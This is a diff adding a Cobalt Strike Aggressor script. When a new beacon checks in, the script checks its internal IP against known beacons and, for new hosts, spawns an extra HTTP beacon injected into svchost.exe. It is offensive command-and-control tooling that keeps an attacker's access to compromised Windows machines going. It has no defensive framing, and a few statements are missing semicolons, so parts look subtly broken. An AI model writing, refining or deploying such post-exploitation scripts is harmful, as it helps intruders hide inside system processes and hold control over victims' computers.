@@ -1,0 +1,42 @@
+@a = @();
+on beacon_initial {
+ 
+	sub http_get {
+        local('$output');
+        $url = [new java.net.URL: $1];
+        $stream = [$url openStream];
+        $handle = [SleepUtils getIOHandle: $stream, $null];
+ 
+        @content = readAll($handle);
+ 
+        foreach $line (@content) {
+            $output .= $line . "\r\n";
+        }
+ 
+        println($output);
+	 }
+	println("1a_list：".@a);
+	@b = @();
+	$internalIP = replace(beacon_info($1, "internal"), " ", "_");
+	add(@b,$internalIP)
+	println("1b_list：".@b);
+	foreach $c (@b){
+		if ($c in @a){
+			println("Exist!")
+		}else{
+			println("Spawning");
+			bspawnto($1, "x64", "%windir%\\sysnative\\svchost.exe");
+			bspawn($1, "http", "x64");
+		}
+ 
+	}
+ 
+	foreach $beacon (beacons()) {
+	   #println("Bid: " . $beacon['internal'] . " is " . $beacon['pid']);
+	   add(@a,$beacon['internal'])
+	
+	println("2a_list：".@a);
+ 
+ 
+	}
+	}
